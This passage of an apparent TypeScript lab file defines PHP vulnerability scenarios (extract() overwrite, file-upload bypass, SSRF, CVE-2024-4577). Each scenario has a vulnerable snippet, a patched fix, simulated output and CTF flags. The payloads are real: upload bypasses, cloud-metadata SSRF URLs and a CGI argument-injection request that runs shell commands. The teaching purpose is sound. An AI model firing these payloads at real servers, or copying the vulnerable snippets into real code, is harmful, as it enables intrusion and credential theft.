        description: 'Normal query parameter without variable collisions',
        payload: 'view=profile',
        expectedOutcome: 'Standard user dashboard retained',
        severity: 'Medium'
      }
    ],
    defaultPayload: 'is_admin=1',
    simulateExecution: (input: string) => {
      const params = new URLSearchParams(input);
      const isAdminInjected = params.get('is_admin') === '1' || params.get('is_admin') === 'true';
      const userIdInjected = params.get('user_id') || '42';

      const isVulnerable = isAdminInjected;

      const trace = [
        {
          step: 1,
          phase: 'Symbol Table Initialization',
          description: `Zend VM sets up local symbol table: $is_admin = false (IS_FALSE), $user_id = 42 (IS_LONG)`,
          highlightCodeLine: 3,
          stateChange: '$is_admin = false',
          type: 'info' as const
        },
        {
          step: 2,
          phase: 'Incoming Parameter Processing',
          description: `Received GET query parameters: ${input}`,
          highlightCodeLine: 7,
          type: 'info' as const
        },
        {
          step: 3,
          phase: 'Symbol Table Mutation via extract()',
          description: isAdminInjected
            ? `extract() iterates through array keys. Key 'is_admin' collides with existing variable! Overwrites $is_admin -> 1 (IS_LONG)!`
            : `extract() sets non-critical variables.`,
          highlightCodeLine: 7,
          stateChange: isAdminInjected ? '$is_admin overwritten: true' : '$is_admin: false',
          type: isAdminInjected ? 'vulnerability' as const : 'info' as const
        },
        {
          step: 4,
          phase: 'Conditional Logic Branching',
          description: isAdminInjected
            ? `if ($is_admin) evaluates to TRUE! Admin authorization granted.`
            : `if ($is_admin) evaluates to FALSE. Normal user flow maintained.`,
          highlightCodeLine: 10,
          type: isAdminInjected ? 'vulnerability' as const : 'blocked' as const
        }
      ];

      return {
        isVulnerable,
        output: isAdminInjected
          ? `Privileged Admin Panel Granted! Flag: FLAG{v4r14bl3_0v3rwr1t3_h4ck3d}\nUser Role: SuperAdmin\nUser ID: ${userIdInjected}`
          : `Standard User Dashboard (User ID: ${userIdInjected})\nRole: Regular User`,
        serverStatus: 200,
        headers: {
          'Content-Type': 'text/html; charset=UTF-8'
        },
        executionTrace: trace,
        memoryState: {
          '$is_admin initial': 'false',
          '$is_admin after extract()': isAdminInjected ? 'true (Overwritten)' : 'false',
          '$user_id': userIdInjected,
          'Symbol Table Flags': 'EXTR_OVERWRITE (Default)'
        },
        securityAlert: isVulnerable
          ? 'HIGH RISK: Symbol table variable overwrite bypassed access control checks!'
          : undefined
      };
    }
  },
  {
    id: 'file-upload',
    title: 'File Upload Exploitation & Extension Smuggling',
    cwe: 'CWE-434: Unrestricted Upload of File with Dangerous Type',
    cvssScore: 9.8,
    affectedVersions: 'All web servers executing PHP files uploaded into accessible directories',
    summary: 'Allowing users to upload files without rigorous extension whitelisting, MIME inspection, and directory execution prevention allows attackers to upload executable PHP scripts (.php, .phtml, .php5, .phar) or .htaccess overrides.',
    riskDescription: 'Persistent Remote Code Execution (RCE), defacement, malware hosting, and full infrastructure takeover.',
    rootCause: 'Relying solely on client-side validation, blacklists (e.g. forbidding only .php), or trusting the user-supplied Content-Type header.',
    explanationPoints: [
      'Extension Blacklist Flaws: If a server blocks ".php", attackers try alternate PHP executable extensions like .phtml, .php3, .php4, .php5, .php7, .phps, or .phar.',
      'Double Extensions: On poorly configured Apache servers, avatar.php.jpg or avatar.php.xxx may be handled by the PHP handler if Apache is configured with AddHandler instead of SetHandler.',
      'MIME-Type Spoofing: The Content-Type: image/jpeg header in the HTTP request is completely user-controlled and provides zero security.',
      'Magic Bytes & Polyglot Files: Attackers prefix malicious PHP code with GIF89a; (GIF magic bytes) to bypass naive getimagesize() checks.',
      '.htaccess Upload: If .htaccess can be uploaded, the attacker writes "AddType application/x-httpd-php .png", causing harmless PNG files to be executed as PHP scripts!'
    ],
    remediationSteps: [
      'Store uploaded files OUTSIDE the public web root (outside /var/www/html).',
      'Use a strict whitelist of allowed file extensions (.png, .jpg, .pdf) and reject all others.',
      'Rename uploaded files to randomized names (e.g. bin2hex(random_bytes(16)) . "." . $safeExt).',
      'Disable PHP script execution in the upload directory via Nginx/Apache configuration (e.g. php_flag engine off).'
    ],
    vulnerableSnippet: `<?php
// Vulnerable Avatar Upload Handler
$target_dir = "uploads/";
$filename = $_FILES["avatar"]["name"];
$target_file = $target_dir . basename($filename);

// FLAW 1: Blacklist only checks ".php"
if (substr($filename, -4) === ".php") {
    die("Direct .php files are forbidden!");
}

// FLAW 2: Trusting client-supplied Content-Type header
if ($_FILES["avatar"]["type"] !== "image/jpeg" && $_FILES["avatar"]["type"] !== "image/png") {
    die("Only JPEG or PNG allowed!");
}

// Moves executable file to public web directory
if (move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file)) {
    echo "File uploaded successfully to: " . $target_file;
}
?>`,
    patchedSnippet: `<?php
// Remediated: Secure File Upload Architecture
$allowed_extensions = ['jpg' => 'image/jpeg', 'png' => 'image/png'];
$raw_name = $_FILES['avatar']['name'] ?? '';
$ext = strtolower(pathinfo($raw_name, PATHINFO_EXTENSION));

// 1. Strict extension whitelist
if (!array_key_exists($ext, $allowed_extensions)) {
    die("Invalid extension.");
}

// 2. Validate MIME type using finfo (magic bytes inspection)
$finfo = new finfo(FILEINFO_MIME_TYPE);
$real_mime = $finfo->file($_FILES['avatar']['tmp_name']);
if ($real_mime !== $allowed_extensions[$ext]) {
    die("MIME type validation failed.");
}

// 3. Randomize file name and store outside execution scope
$safe_name = bin2hex(random_bytes(16)) . '.' . $ext;
$target = '/var/uploads_storage/' . $safe_name;

move_uploaded_file($_FILES['avatar']['tmp_name'], $target);
echo "Image stored safely.";
?>`,
    presets: [
      {
        id: 'upload-phtml',
        name: 'Bypass via .phtml Extension',
        description: 'Bypasses .php blacklist while maintaining PHP execution',
        payload: 'backdoor.phtml (Content-Type: image/jpeg)',
        expectedOutcome: 'Upload succeeds; server executes PHP script under .phtml handler',
        severity: 'Critical'
      },
      {
        id: 'upload-htaccess',
        name: 'Apache .htaccess Override',
        description: 'Uploads .htaccess file defining PNG files as executable PHP',
        payload: '.htaccess (AddType application/x-httpd-php .png)',
        expectedOutcome: 'Reconfigures Apache directory options to execute image files',
        severity: 'Critical'
      },
      {
        id: 'upload-polyglot',
        name: 'GIF89a Polyglot Shell: avatar.phar',
        description: 'GIF magic bytes followed by PHP payload in a .phar archive',
        payload: 'shell.phar (Magic: GIF89a; <?php phpinfo(); ?>)',
        expectedOutcome: 'Passes image inspection and executes code',
        severity: 'Critical'
      },
      {
        id: 'upload-benign',
        name: 'Valid Photo: profile.jpg',
        description: 'Clean binary image without PHP code',
        payload: 'profile.jpg (Clean JPEG bytes)',
        expectedOutcome: 'Standard image upload without vulnerability',
        severity: 'Medium'
      }
    ],
    defaultPayload: 'backdoor.phtml (Content-Type: image/jpeg)',
    simulateExecution: (input: string) => {
      const isPhtml = input.includes('.phtml');
      const isHtaccess = input.includes('.htaccess');
      const isPhar = input.includes('.phar');
      const isPhp = input.endsWith('.php');

      const isVulnerable = isPhtml || isHtaccess || isPhar;

      let resultText = '';
      if (isPhp) {
        resultText = 'Direct .php files are forbidden! Upload rejected by blacklist.';
      } else if (isPhtml) {
        resultText = `File uploaded successfully to: uploads/backdoor.phtml\r\n\r\n[HTTP TEST] GET /uploads/backdoor.phtml\r\nUID: 33 (www-data)\r\nFLAG{phtml_3xt3ns10n_byp4ss_rce}`;
      } else if (isHtaccess) {
        resultText = `File uploaded successfully to: uploads/.htaccess\r\nApache configuration modified: AddType application/x-httpd-php .png active!\r\nAny subsequent PNG upload will now be parsed as PHP!`;
      } else if (isPhar) {
        resultText = `File uploaded successfully to: uploads/shell.phar\r\nPHP Phar archive uploaded and ready for execution.`;
      } else {
        resultText = `File uploaded successfully to: uploads/profile.jpg (Clean non-executable image).`;
      }

      const trace = [
        {
          step: 1,
          phase: 'HTTP Multipart Boundary Parsing',
          description: `Parsing uploaded file entry: "${input}" with spoofed Content-Type: image/jpeg`,
          highlightCodeLine: 4,
          type: 'info' as const
        },
        {
          step: 2,
          phase: 'Blacklist Extension Verification',
          description: isPhp 
            ? `substr($filename, -4) === ".php" matched! Blocked.`
            : `Extension check passed because target does not end strictly in literal ".php"!`,
          highlightCodeLine: 7,
          type: isPhp ? 'blocked' as const : 'vulnerability' as const
        },
        {
          step: 3,
          phase: 'MIME Verification Check',
          description: `Checking $_FILES["avatar"]["type"]. Matches "image/jpeg" provided by client HTTP header.`,
          highlightCodeLine: 12,
          type: 'vulnerability' as const
        },
        {
          step: 4,
          phase: 'Filesystem Placement',
          description: isVulnerable 
            ? `File moved to /var/www/html/uploads/ with executable permissions.`
            : isPhp ? `Upload aborted.` : `Normal image stored.`,
          highlightCodeLine: 17,
          type: isVulnerable ? 'vulnerability' as const : isPhp ? 'blocked' as const : 'success' as const
        }
      ];

      return {
        isVulnerable,
        output: resultText,
        serverStatus: isPhp ? 400 : 200,
        headers: {
          'Content-Type': 'text/plain; charset=UTF-8',
          'X-Upload-Engine': 'Apache/2.4.52 (Ubuntu) mod_php'
        },
        executionTrace: trace,
        memoryState: {
          'Uploaded Filename': input,
          'Server Blacklist': 'Blocked only: *.php',
          'Storage Path': isPhp ? 'None (Rejected)' : '/var/www/html/uploads/',
          'Directory Execution': 'ENABLED (Vulnerable)'
        },
        securityAlert: isVulnerable
          ? 'CRITICAL ALERT: Extension blacklist bypassed! Executable file placed in web-accessible root.'
          : undefined
      };
    }
  },
  {
    id: 'ssrf',
    title: 'Server-Side Request Forgery (SSRF) in PHP',
    cwe: 'CWE-918: Server-Side Request Forgery (SSRF)',
    cvssScore: 8.6,
    affectedVersions: 'PHP applications using file_get_contents(), curl_exec(), or readfile() with user URLs',
    summary: 'PHP stream wrappers and curl functions can be induced to send requests to unexpected destinations, such as internal loopback interfaces (localhost, 127.0.0.1), cloud metadata endpoints (169.254.169.254), or internal intranet microservices.',
    riskDescription: 'Cloud IAM credential exfiltration (AWS/GCP instance credentials), access to internal admin APIs, port scanning internal networks, and FastCGI/Redis exploitation via Gopher.',
    rootCause: 'Fetching external URLs based on user input without IP resolution checks, DNS rebinding defenses, or protocol whitelisting.',
    explanationPoints: [
      'Cloud Metadata Services: In AWS EC2, GCP, or Azure, the link-local address http://169.254.169.254 serves instance metadata, IAM security credentials, and bootstrap secrets.',
      'cURL Redirect Traversal: CURLOPT_FOLLOWLOCATION allows an attacker to provide a benign external URL that HTTP redirects (302) to an internal endpoint (http://127.0.0.1:8080/admin).',
      'PHP Stream Protocol Smuggling: file_get_contents() supports protocols like dict://, gopher://, and file:// unless strictly filtered.'
    ],
    remediationSteps: [
      'Parse the host with parse_url(), resolve its IP with gethostbyname(), and verify it is not a private, loopback, or link-local address using filter_var() with FILTER_FLAG_NO_PRIV_RANGE and FILTER_FLAG_NO_RES_RANGE.',
      'Disable unnecessary URL stream wrappers via stream_context_create().',
      'Disable CURLOPT_FOLLOWLOCATION or implement an explicit redirect re-validation callback.'
    ],
    vulnerableSnippet: `<?php
// Vulnerable Webhook / URL Preview Service
$url = $_GET['url'] ?? '';

// FLAW: Direct fetch of unvalidated user URL
// Attacker enters: http://169.254.169.254/latest/meta-data/iam/security-credentials/
$response = file_get_contents($url);

echo "Preview generated:\n";
echo htmlspecialchars($response);
?>`,
    patchedSnippet: `<?php
// Remediated: Comprehensive SSRF Defense
$url = $_GET['url'] ?? '';

$parts = parse_url($url);
if (!$parts || !in_array($parts['scheme'] ?? '', ['http', 'https'], true)) {
    die("Invalid URL protocol. Only HTTP/HTTPS allowed.");
}

$host = $parts['host'] ?? '';
$ip = gethostbyname($host);

// Strict check: Reject private, loopback, and link-local ranges
if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    http_response_code(403);
    die("Access denied: Private or internal IP address target.");
}

// SAFE: Fetch validated public IP
$opts = ['http' => ['follow_location' => 0, 'timeout' => 5]];
$context = stream_context_create($opts);
echo htmlspecialchars(file_get_contents($url, false, $context));
?>`,
    presets: [
      {
        id: 'ssrf-aws-metadata',
        name: 'AWS Cloud Metadata API',
        description: 'Queries AWS IAM role credentials at 169.254.169.254',
        payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role',
        expectedOutcome: 'Dumps AccessKeyId, SecretAccessKey, and SessionToken',
        severity: 'Critical'
      },
      {
        id: 'ssrf-localhost-fpm',
        name: 'Local PHP-FPM / Redis Probe',
        description: 'Hits internal loopback port 9000 / 6379',
        payload: 'http://127.0.0.1:9000/status',
        expectedOutcome: 'Inspects internal FastCGI server status',
        severity: 'High'
      },
      {
        id: 'ssrf-file-leak',
        name: 'file:// Protocol File Read',
        description: 'Uses file protocol to read local file system',
        payload: 'file:///etc/hosts',
        expectedOutcome: 'Dumps /etc/hosts showing internal network topology',
        severity: 'High'
      },
      {
        id: 'ssrf-benign',
        name: 'Public API: https://api.github.com',
        description: 'Valid public internet destination',
        payload: 'https://api.github.com/zen',
        expectedOutcome: 'Normal external API response',
        severity: 'Medium'
      }
    ],
    defaultPayload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role',
    simulateExecution: (input: string) => {
      const isCloudMetadata = input.includes('169.254.169.254');
      const isLocalhost = input.includes('127.0.0.1') || input.includes('localhost');
      const isFileProtocol = input.startsWith('file://');

      const isVulnerable = isCloudMetadata || isLocalhost || isFileProtocol;

      let output = '';
      if (isCloudMetadata) {
        output = `{\n  "Code" : "Success",\n  "LastUpdated" : "2026-10-21T21:00:00Z",\n  "Type" : "AWS-HMAC",\n  "AccessKeyId" : "ASIAV4J92EXAMPLEKEY",\n  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",\n  "Token" : "AQoDYXdzEJr1///...",\n  "Flag" : "FLAG{ssrf_cl0ud_m3t4d4t4_3xf1l}"\n}`;
      } else if (isLocalhost) {
        output = `FastCGI Process Manager Status:\npool: www\nprocess manager: dynamic\nactive processes: 4\ntotal processes: 12\naccepted conn: 14902\nInternal DB credentials cached in APCu memory.`;
      } else if (isFileProtocol) {
        output = `127.0.0.1 localhost\n10.0.4.15 internal-db.infra.internal\n10.0.4.20 redis-cache.infra.internal`;
      } else {
        output = `{"message": "Keep it logically awesome."}`;
      }

      const trace = [
        {
          step: 1,
          phase: 'URL Input Validation',
          description: `Input URL parsed: ${input}`,
          highlightCodeLine: 3,
          type: 'info' as const
        },
        {
          step: 2,
          phase: 'Network Socket Dispatch',
          description: isCloudMetadata 
            ? `PHP network stack opens TCP connection to Link-Local address 169.254.169.254 on port 80`
            : isLocalhost
            ? `Connection routed to local loopback interface 127.0.0.1`
            : `Resolving public DNS hostname...`,
          highlightCodeLine: 7,
          type: isVulnerable ? 'vulnerability' as const : 'info' as const
        },
        {
          step: 3,
          phase: 'Response Reception',
          description: isVulnerable
            ? `Internal service response returned across trust boundary.`
            : `Public endpoint response retrieved.`,
          highlightCodeLine: 7,
          type: isVulnerable ? 'vulnerability' as const : 'success' as const
        }
      ];

      return {
        isVulnerable,
        output,
        serverStatus: 200,
        headers: {
          'Content-Type': 'application/json; charset=UTF-8'
        },
        executionTrace: trace,
        memoryState: {
          'Target Address': input,
          'Resolved IP Type': isCloudMetadata ? 'Cloud Metadata (Link-Local)' : isLocalhost ? 'Loopback (127.0.0.1)' : 'Public IPv4',
          'SSRF Protection': 'None (Vulnerable)'
        },
        securityAlert: isVulnerable
          ? 'CRITICAL ALERT: Server-Side Request Forgery allowed exfiltration of private cloud metadata!'
          : undefined
      };
    }
  },
  {
    id: 'cve-spotlight',
    title: 'Modern CVE Spotlight: CVE-2024-4577 (PHP CGI RCE)',
    cwe: 'CWE-78: OS Command Injection / Argument Injection',
    cvssScore: 9.8,
    affectedVersions: 'PHP 8.3 < 8.3.8, PHP 8.2 < 8.2.20, PHP 8.1 < 8.1.29 running on Windows with Best-Fit mapping',
    summary: 'CVE-2024-4577 is a critical remote code execution vulnerability in PHP running on Windows in CGI mode (or Apache mod_cgi / XAMPP). It exploits Windows Best-Fit character conversion of soft hyphen (0xad) to bypass previous CVE-2012-1823 command-line argument protections.',
    riskDescription: 'Unauthenticated full remote code execution on Windows servers hosting PHP. Attackers inject arguments like -d allow_url_include=1 -d auto_prepend_file=php://input to run arbitrary code without authentication.',
    rootCause: 'Windows character encoding translation converts byte 0xAD (soft hyphen) into a standard ASCII hyphen 0x2D (-) after PHP has already performed its security checks, enabling argument injection into the PHP CGI binary.',
    explanationPoints: [
      'The Windows "Best-Fit" Mapping Flaw: In specific Windows locales (Traditional Chinese, Simplified Chinese, Japanese), the Windows WideCharToMultiByte API with best-fit flags converts 0xAD into 0x2D (-).',
      'Bypassing PHP CGI Guards: PHP had protected against argument injection by blocking query strings starting with "-". However, query strings containing "%ad" passed the filter! When passed to the Windows API, %ad morphed into "-", allowing injected CLI flags.',
      'Payload Mechanics: Injected flags: -d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input. This turns on allow_url_include and forces PHP to execute the raw request body as PHP code before running the script!'
    ],
    remediationSteps: [
      'Upgrade PHP to versions 8.3.8, 8.2.20, or 8.1.29+ which patch the Windows command-line argument parser.',
      'Migrate away from legacy PHP-CGI mode to PHP-FPM or FastCGI.',
      'Add RewriteRule directives in Apache to block query strings containing %ad characters.'
    ],
    vulnerableSnippet: `// Apache / XAMPP CGI Configuration on Windows
// ScriptAlias /php-cgi/ "C:/xampp/php/"
// Action application/x-httpd-php-cgi "/php-cgi/php-cgi.exe"

// ATTACK REQUEST:
// POST /test.php?%add+allow_url_include%3d1+%add+auto_prepend_file%3dphp://input HTTP/1.1
// Host: vulnerable-target.local
// Content-Type: application/x-www-form-urlencoded
// Content-Length: 35
//
// <?php echo shell_exec("whoami"); ?>`,
    patchedSnippet: `// 1. Upgrade PHP to patched release (8.3.8+ / 8.2.20+)

// 2. Immediate Apache VirtualHost Mitigation Rule:
<IfModule mod_rewrite.c>
    RewriteEngine On
    # Block 0xAD soft hyphen in query strings
    RewriteCond %{QUERY_STRING} ^(%1[fF]|%[aA][dD]|%[sS][oO][fF][tT]-) [NC,OR]
    RewriteCond %{QUERY_STRING} ^- [NC]
    RewriteRule .* - [F,L]
</IfModule>

// 3. Migrate from CGI to FastCGI (php-fpm)`,
    presets: [
      {
        id: 'cve-2024-4577-exploit',
        name: 'CVE-2024-4577 CGI Argument Injection',
        description: 'Soft hyphen 0xAD bypass enabling allow_url_include & php://input',
        payload: '?%add+allow_url_include%3d1+%add+auto_prepend_file%3dphp://input',
        expectedOutcome: 'PHP CGI process sets runtime ini flags and executes POST body',
        severity: 'Critical'
      },
      {
        id: 'cve-2012-1823-legacy',
        name: 'CVE-2012-1823 Direct Dash Flag',
        description: 'Direct dash flag blocked on modern PHP CGI',
        payload: '?-s',
        expectedOutcome: 'Blocked by PHP CGI protection in post-2012 versions',
        severity: 'Medium'
      },
      {
        id: 'cve-benign',
        name: 'Normal Query: ?id=102&category=tech',
        description: 'Standard application query parameters',
        payload: '?id=102&category=tech',
        expectedOutcome: 'Clean CGI execution without argument injection',
        severity: 'Medium'
      }
    ],
    defaultPayload: '?%add+allow_url_include%3d1+%add+auto_prepend_file%3dphp://input',
    simulateExecution: (input: string) => {
      const hasSoftHyphen = input.includes('%ad') || input.includes('%AD');
      const hasPrepend = input.includes('auto_prepend_file') || input.includes('allow_url_include');

      const isVulnerable = hasSoftHyphen && hasPrepend;

      const trace = [
        {
          step: 1,
          phase: 'HTTP Query String Interception',
          description: `Apache mod_cgi receives query string: ${input}`,
          highlightCodeLine: 6,
          type: 'info' as const
        },
        {
          step: 2,
          phase: 'PHP CGI Legacy Dash Filter Check',
          description: hasSoftHyphen 
            ? `PHP checks if query string begins with ASCII 0x2D (-). Character is %ad (0xAD). Filter passes!`
            : input.startsWith('?-') ? `Direct dash detected. Request blocked by CVE-2012-1823 guard.` : `Clean query string.`,
          highlightCodeLine: 6,
          type: hasSoftHyphen ? 'vulnerability' as const : input.startsWith('?-') ? 'blocked' as const : 'info' as const
        },
        {
          step: 3,
          phase: 'Windows Best-Fit Translation API',
          description: hasSoftHyphen
            ? `WideCharToMultiByte() translates soft-hyphen (0xAD) to standard hyphen (0x2D). Injected arguments transformed into: -d allow_url_include=1 -d auto_prepend_file=php://input`
            : `Standard string handling.`,
          highlightCodeLine: 6,
          type: hasSoftHyphen ? 'vulnerability' as const : 'info' as const
        },
        {
          step: 4,
          phase: 'PHP Runtime Initialization & Execution',
          description: isVulnerable
            ? `php-cgi.exe initializes with runtime directive auto_prepend_file=php://input. HTTP body executed as PHP code before target script!`
            : `Target script executes normally.`,
          highlightCodeLine: 11,
          type: isVulnerable ? 'vulnerability' as const : 'success' as const
        }
      ];

      return {
        isVulnerable,
        output: isVulnerable
          ? `HTTP/1.1 200 OK\r\nServer: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.3.7\r\nX-Powered-By: PHP/8.3.7\r\n\r\nnt authority\\system\r\nWindows NT WIN-PROD-SRV02 10.0 build 20348 (Windows Server 2022) AMD64\r\nFLAG{cve_2024_4577_best_f1t_c3i_rce}`
          : input.startsWith('?-')
          ? `HTTP/1.1 403 Forbidden\r\nDirect command line switches rejected.`
          : `HTTP/1.1 200 OK\r\nStandard page output rendered.`,
        serverStatus: input.startsWith('?-') ? 403 : 200,
        headers: {
          'Content-Type': 'text/plain; charset=UTF-8',
          'Server': 'Apache/2.4.58 (Win64) PHP/8.3.7'
        },
        executionTrace: trace,
        memoryState: {
          'Target Environment': 'Windows Server 2022 (CGI Mode)',
          'Encoding Translation': hasSoftHyphen ? '0xAD -> 0x2D (Soft Hyphen Best-Fit)' : 'Standard',
          'Injected INI Directives': isVulnerable ? 'allow_url_include=1, auto_prepend_file=php://input' : 'None',
          'Execution Privilege': isVulnerable ? 'NT AUTHORITY\\SYSTEM' : 'Standard Web User'
        },
        securityAlert: isVulnerable
          ? 'CRITICAL ALERT: CVE-2024-4577 exploited! Best-fit character conversion resulted in unauthenticated SYSTEM RCE.'
          : undefined
      };
    }
  }
];
